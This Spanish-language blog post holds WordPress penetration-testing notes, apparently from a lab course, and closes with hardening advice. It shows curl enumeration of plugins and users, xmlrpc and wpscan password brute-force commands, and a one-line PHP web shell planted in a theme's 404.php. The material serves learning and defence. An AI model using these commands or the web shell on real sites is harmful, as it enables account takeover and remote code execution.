---
layout: post
author: Sergio Salgado
---
## [](#header-2)Wordpress Structure
Estructura default de wordpress
wp-config.php contiene informacion requerida para conectarse a la base de datos, tambien se puede usar para activar el modo debug.

```s 
tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

## [](#header-2)Archivos clave de wordpress

El directorio wp-content contiene plugins y temas que han sido almacenados. El subdirectorio uploads/ contiene usualmente los archivos que han sido cargados en la Plataforma. Deben ser cuidadosamente enumerados por que podrian contener archivos sensibles.
 - license.txt, contiene informacion util sobre la version de worpress
 - wp-activate.php es usado para la activacion de correo electronico 
 - wp-admin 
  -/wp-admin/login.php
  -/wp-admin/wp-login.php
  -/login.php
  -/wp-login.php

```s 
tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

## [](#header-2)Roles de Usuario de Wordpress

Existen 5 tipos de usuarios en una instalacion standard de WordPress. Los cuales son 
- Administrador Tiene acceso a funciones de administracion del website. Esto incluye agregar y eliminar usuarios y posts, asi como editar codigo Fuente. 
- Editor Puede publicar y gestionar posts, incluyendo posts de otros usuarios
- Author Pueden publicar y gestionar posts
- Contributor Este usuario puede escribir y gestionar sus propios posts pero no puede publicarlos
- Subscriber Puede buscar entre posts y editar su perfil

## [](#header-2)Enumeracion de la version Core

En esta parte, de acuerdo a la version del wordpress podriamos numerar usuarios por default ante instalacion. 

Buscar en el codigo Fuente la etiqueta meta generator

Buscar en los link de estilos css y al final de la extension, se nos dara una pista de la version 

Buscar en las etiquetas script de javascript y al final de la extension, se nos dara una pista de la version 

En versions antiguas existe el archive readme.html

## [](#header-2)Enumeracion de plugins y temas
### [](#header-3)Enumeracion de plugins
```s 
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

### [](#header-3)Enumeracion de Temas
```s 
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```
## [](#header-2)Enumeracion Activa de plugins

Como no todo se puede extraer de manera pasiva, provaremos en mandar una peticion get a una pagina o archivo que no exista
```s 
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
curl -s -X GET http://94.237.54.201:54074/wp-content/plugins/mail-masta/
```

Mismo caso para los temas. Para automatizar el proceso Podemos usar herramientas como wfuzz o wpscan o construer tu propio script de bash.


## [](#header-2)Directory Indexing
No solamente los plugins activos deberian ser nuestro objetivo, ya que Tambien es possible acceder a plugins desactivados y acceder a sus scripts o funciones. Es una Buena practica eliminar el plugin que no se utiliza o actualizarlo.
### [](#header-3)Enumeracion de usuarios
Una vez consiguiendo un usuario, podriamos entrar a las configuraciones como autor o como administrador.
El primer metodo es pasando el mouse por encima del autor del post, y se desplegara la uta para el perfil de usuario.
Segundo metodo, extrayendo una lista de usuarios
```s 
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```
### [](#header-3)Login
Una vez que tengamos una lista valida de usuarios, Podemos hacer un ataque de fuerza bruta forzando a entrar por el panel de login o el archive xmlrpc.php
Si nuestro POST contra el archive xmlrpc contiene credenciales validas, obtendremos una salida como esta:
```s 
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Si no es valida, obtendremos un codigo de respuesta 403.

Arme un commando de wfuzz para hacer un ataque e fuerza bruta una vez que tengamos usaurios validos

Para ver los metodos posibles a ejecutar, Podemos usar:
```xml
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
```
```s 
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://www.hackerscentral.com.mx/xmlrpc.php
```

Ahora, al usar wp-scan, Podemos usar un api de <a href="https://wpscan.com/"> wpscan</a> , el commando a ejecutar sera 
```s 
wpscan --api-token API --url http://192.168.1.10
#Enumeracion agresiva, esta si trae resultados diferentes
wpscan --api-token API --url http://backdoor.htb --disable-tls-checks -e ap --plugins-detection aggressive
```
## [](#header-2)Enumeracion con wpscan
Por default, wpscan enumera plugins vulnerables, temas, usuarios, media y backups. 
Podemos usar las flags para solicitor components especificos del sitio como por ejemplo los plugins con:
```s
wpscan --url http://blog.inlanefreight.com --enumerate ap --api-token
```

## [](#header-2)Ataque a usuarios
wpscan tiene 2 ataques, el de login tarda mas.
```s 
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

Una vez teniendo acceso de admin, Podemos ejecutar una shell para php, empezamos yendonos a Temas, /Editor de temas, escogemos un ema que no esté en uso y un archive del tema, se usa en el ejemplo el 404.php y yo prefer borrar todo el contenido de ese archivo por ejemplo
```php
<?php system($_REQUEST['cmd']); ?>
```
```s
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
## [](#header-2)Hacking con msf
Podemos usar el modulo wp_admin_shell_upload, pero necesitamos credenciales con permisos de escritura

## [](#header-2)Hardening a wordpress
### [](#header-3)Buenas practicas
Hacer actualizaciones constantes, se recomienda habilitar en el archivo wp-config.php las lineas siguientes
```php
#
#Actualizacion automatica de wordpress
define( 'WP_AUTO_UPDATE_CORE', true );
#Actualizacion automatica de pllugins
add_filter( 'auto_update_plugin', '__return_true' );
#Actualizacion automatica de temas
add_filter( 'auto_update_theme', '__return_true' );
```

### [](#header-3)Gestion de Plugins y temas
Instalar solo plugins y temas confiables (revisar los revies, popularidad, numero de instalaciones y ultima actualizacion) de worpress.com.
Siempre tener actualizados los plugins y temas, Eliminar cualquier tema que ya no este en uso.
### [](#header-3)Mejorar la seguridad de Wordpress
Hay varios plugins que nos pueden ayudar a mejorar la seguridad del website

* <a href="https://wordpress.org/plugins/sucuri-scanner/">Sucuri Security</a> 
Este plugin contiene las siguientes reglas de seguridad:
   - Security Activity Auditing
   - Monitoreo de Integridad de los archivos
   - Escaneo remoto de malware
   - Monitoreo de ListaNegra

* <a href="https://wordpress.org/plugins/better-wp-security/">iThemes Security</a>
Este plugin nos ofrece mas de 30 formas de proteger nuestro sitio como:
   - MFA
   - Wordpress Salts & Security Keys
   - Google reCAPTCHA
   - User Action Logging

* <a href="https://wordpress.org/plugins/wordfence/">Wordfence Security</a>
Consiste en un endpoint de firewall y analisis de malware
   - El WAF identifica y bloquea el trafico malicioso
   - La version premium provee de una regla de firewall en tiempo real y actualizacion de amenazas.
   - El premium tambien habilita el blacklist de IP para bloquear todas las peticiones de IPs maliciosas.

### [](#header-3)Gestion de usuarios
Los usuarios son generalmente objetivo por que son vistos como el eslabon mas debil. Las siguientes son las mejores practicas respecto a usuarios:
 - Deshabilitar al admin estandar y crear cuentas con nombres dificiles de adivinar.
 - Forzar a usar contrasenas fuertes
 - Restringir a los usuarios a los privilegios que necesitan
 - Periodicamente auditar los derechos de acceso, remover cualquier cuenta que no este en uso.

### [](#header-3)Gestion de configuracion
Instalar el plugin que deshabilita la enumeracion de usuarios.
Limitar los intentos de inicio de sesion para prevenir ataques de fuerza bruta
renombrar el wp-admin.php o relocalizarlo para no dejarlo tan accesible a internet.
